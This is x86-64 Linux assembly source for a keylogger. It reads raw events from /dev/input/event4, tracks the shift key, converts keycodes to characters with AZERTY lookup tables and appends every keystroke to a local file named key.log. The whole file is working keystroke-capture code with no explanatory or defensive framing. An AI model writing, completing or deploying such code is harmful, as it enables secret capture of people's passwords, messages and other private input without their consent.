section .text
  global _start

_start:
  mov rax, 2
  mov rdi, file
  mov rsi, 00001102
  mov rdx, 422
  syscall

  mov [fd], rax

  test rax, rax
  js error 
  
  mov rax, 2
  mov rdi, source
  xor rsi, rsi
  syscall

  mov [sd], rax

  test rax, rax
  js error

  jmp readKey

  mov rax, 60
  xor rdi, rdi
  syscall

readKey:
  xor rax, rax
  mov rsi, event
  mov rdx, 24
  mov rdi, [sd]
  syscall

  mov byte al, [event + 16]
  cmp ax, 0x0
  je readKey
  cmp ax, 0x4
  je readKey

  mov byte al, [event + 18]
  cmp al, 42
  je checkShift

  cmp al, 54
  je checkShift

  mov byte al , [event + 20]
  cmp al, 0x0
  je readKey

  mov byte al , [event + 18]
  cmp byte [mode], 1
  je upperKey
  jne lowerKey

checkShift:
  mov byte al, [event + 20]
  cmp al, 0x1
  je pressShift
  jne releaseShift

pressShift:
  mov byte [mode], 1
  jmp readKey

releaseShift:
  mov byte [mode], 0
  jmp readKey

upperKey:
  mov byte bl, [upperKeys + eax] 
  mov byte [key], bl

  jmp writeKey

lowerKey:
  mov byte bl, [lowerKeys + eax]
  mov byte [key], bl

  jmp writeKey

writeKey:
  mov rax, 1
  mov rdi, [fd]
  mov rsi, key
  mov rdx, 1
  syscall

  jmp readKey

error:
  mov rax, 1
  mov rdi, 1
  mov rsi, errorMsg
  mov rdx, errorMsgLen
  syscall

  mov rax, 60
  mov rdi, 1
  syscall

section .data
  errorMsg db "Error opening file", 0xa
  errorMsgLen equ $ - errorMsg

  source db "/dev/input/event4", 0
  sd dq 0

  file db "./key.log", 0
  fd dq 0

  lowerKeys db `??1234567890-=\b\tazertyuiop[]\n?qsdfghjkl\;'\`?\mwxcvbn,./?*? `
  upperKeys db `??1234567890-=\b\tAZERTYUIOP[]\n?QSDFGHJKL\;'\`?\MWXCVBN,./?*? `

  mode db 0, 0

section .bss
  event resb 24
  key resb 1
